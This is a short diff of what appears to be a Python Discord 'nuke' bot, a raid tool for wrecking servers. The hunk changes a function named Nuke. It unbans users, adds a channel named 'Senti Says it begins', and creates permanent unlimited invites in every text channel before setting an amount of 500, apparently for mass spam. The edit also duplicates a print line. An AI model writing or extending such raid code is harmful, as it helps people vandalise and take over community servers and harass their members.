@@ -79,7 +79,9 @@ async def Nuke (ctx):
         print(Fore.MAGENTA + f"{user.name}#{user.discriminator} Was successfully unbanned." + Fore.RESET)
       except:
         print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
-       for channel in guild.text_channels:
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} Was not unbanned." + Fore.RESET)
+    await guild.create_text_channel("Senti Says it begins")
+    for channel in guild.text_channels:
         link = await channel.create_invite(max_age = 0, max_uses = 0)
         print(f"New Invite: {link}")
     amount = 500
